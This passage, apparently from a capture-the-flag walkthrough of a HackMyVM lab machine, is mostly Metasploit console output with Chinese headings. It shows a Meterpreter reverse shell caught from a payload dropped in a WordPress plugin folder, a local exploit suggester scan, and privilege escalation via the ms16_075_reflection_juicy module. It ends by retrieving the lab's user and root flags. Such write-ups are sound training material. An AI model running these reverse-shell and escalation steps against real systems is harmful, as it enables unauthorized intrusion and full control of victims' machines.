payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.0.108
LHOST => 192.168.0.108
msf6 exploit(multi/handler) > set LPORT 6666
LPORT => 6666
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.0.108:6666 
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.0.108:6666 
[*] Sending stage (177734 bytes) to 192.168.0.110
[*] Meterpreter session 1 opened (192.168.0.108:6666 -> 192.168.0.110:49186) at 2026-01-27 08:17:16 -0500

meterpreter > dir
Listing: C:\xampp\htdocs\wordpress\wp-content\plugins\editor\editor\extensions\pagebuilder\includes
===================================================================================================

Mode       Size   Type  Last modified   Name
----       ----   ----  -------------   ----
100666/rw  9400   fil   2024-06-30 13:  ajax_shortcode
-rw-rw-                 00:46 -0400     _pattern.php
100666/rw  26382  fil   2024-06-30 13:  pagebuilder-op
-rw-rw-                 00:46 -0400     tions-manager.
                                        class.php
100666/rw  68418  fil   2024-06-30 13:  pagebuilder.cl
-rw-rw-                 00:46 -0400     ass.php
100666/rw  5561   fil   2024-06-30 13:  pagebuildermod
-rw-rw-                 00:46 -0400     ules.class.php
100666/rw  34306  fil   2024-06-30 13:  pb-shortcodes.
-rw-rw-                 00:46 -0400     class.php
100666/rw  16293  fil   2024-06-30 13:  pb-skin-loader
-rw-rw-                 00:46 -0400     .class.php
100777/rw  73802  fil   2026-01-28 00:  shell.exe
xrwxrwx                 06:56 -0500

meterpreter > 

```

# 提权
```plain
meterpreter > dir
Listing: C:\Users\websvc\Desktop
================================

Mode         Size  Type  Last modified     Name
----         ----  ----  -------------     ----
100666/rw-r  282   fil   2024-06-29 22:10  desktop.ini
w-rw-                    :54 -0400
100666/rw-r  33    fil   2024-06-30 13:10  user.txt
w-rw-                    :01 -0400

meterpreter > type user.txt
[*] Downloading: user.txt -> /home/kali/Desktop/hmv/user.txt
[*] Downloaded 33.00 B of 33.00 B (100.0%): user.txt -> /home/kali/Desktop/hmv/user.txt
[*] Completed  : user.txt -> /home/kali/Desktop/hmv/user.txt
meterpreter > 

┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# cat user.txt 
4159a2b3a38697518722695cbb09ee46
```

```plain
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 192.168.0.110 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/modules/exploits/linux/local/sock_sendpage.rb:47: warning: key "Notes" is duplicated and overwritten on line 68
/usr/share/metasploit-framework/modules/exploits/unix/webapp/phpbb_highlight.rb:46: warning: key "Notes" is duplicated and overwritten on line 51
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 192.168.0.110 - 205 exploit checks are being tried...
[+] 192.168.0.110 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 192.168.0.110 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.0.110 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 192.168.0.110 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 192.168.0.110 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 192.168.0.110 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 192.168.0.110 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 192.168.0.110 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 192.168.0.110 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 192.168.0.110 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 192.168.0.110 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 192.168.0.110 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.                                       
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.                                       
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                    
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.                                       
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.                                       
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.                                       
 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.                                       
 8   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                        
 9   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.                                       
 10  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.                                       
 11  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.                                       
 12  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.                                      
 13  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.                                             
 14  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.                                             
 15  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system  
 16  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.                                             
 17  exploit/windows/local/bthpan                                   No                       The target is not exploitable.                                             
 18  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.                                             
 19  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.                                             
 20  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found       
 21  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.                                             
 22  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.                                             
 23  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found             
 24  exploit/windows/local/ikeext_service                           No                       The check raised an exception.                                             
 25  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.                                             
 26  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.                                             
 27  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.                                             
 28  exploit/windows/local/mqac_write                               No                       The target is not exploitable.                                             
 29  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.                                             
 30  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2008 R2 (6.1 Build 7600). is not vulnerable                                          
 31  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.                                             
 32  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.                                             
 33  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.                                             
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.                                             
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.                                             
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.                                             
 37  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.                                             
 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.                                             
 39  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found             
 40  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.                                             
 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.                                             
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.                                             

[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 

```

```plain
msf6 exploit(windows/local/bypassuac_comhijack) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_comhijack) > run
[*] Started reverse TCP handler on 192.168.0.108:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[-] Exploit aborted due to failure: bad-config: x86 payload selected for x64 system
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/bypassuac_comhijack) >

[*] Started reverse TCP handler on 192.168.0.108:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] This target is not presently supported by this exploit. Support may be added in the future!
[!] Attempts to exploit this target with this module WILL NOT WORK!
[!] The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[*] Step #1: Checking target environment...
[-] Exploit aborted due to failure: bad-config: Target is running Windows, its not a version this module supports! Bailing...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/cve_2020_078
7_bits_arbitrary_file_move) >     

msf6 exploit(windows/local/ms13_053_schlamperei) > run
[*] Started reverse TCP handler on 192.168.0.108:4444 
[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms13_053_schlamperei) > 

msf6 exploit(windows/local/ms13_081_tra
ck_popup_menu) > run                                    
[*] Started reverse TCP handler on 192.168.0.108:4444 
[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms13_081_tra
ck_popup_menu) >  

msf6 exploit(windows/local/ms16_075_ref
lection_juicy) > set session 1                          
session => 1
msf6 exploit(windows/local/ms16_075_ref
lection_juicy) > run                                    
[*] Started reverse TCP handler on 192.168.0.108:4444 
[+] Target appears to be vulnerable (Windows Server 2008 R2)
[*] Launching notepad to host the exploit...
[+] Process 928 launched.
[*] Reflectively injecting the exploit DLL into 928...
[*] Injecting exploit into 928...
[*] Exploit injected. Injecting exploit configuration into 928...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.0.110
[*] Meterpreter session 2 opened (192.168.0.108:4444 -> 192.168.0.110:49192) at 2026-01-27 12:48:12 -0500

meterpreter > 

```

可以发现通过windows/local/ms16_075_reflection_juicy打通了

flag都在用户桌面上

```plain
meterpreter > download root.txt 
[*] Downloading: root.txt -> /home/kali/Desktop/hmv/root.txt
[*] Downloaded 33.00 B of 33.00 B (100.0%): root.txt -> /home/kali/Desktop/hmv/root.txt
[*] Completed  : root.txt -> /home/kali/Desktop/hmv/root.txt
meterpreter > 

┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# cat root.txt  
5b38df6802c305e752c8f02358721acc
```





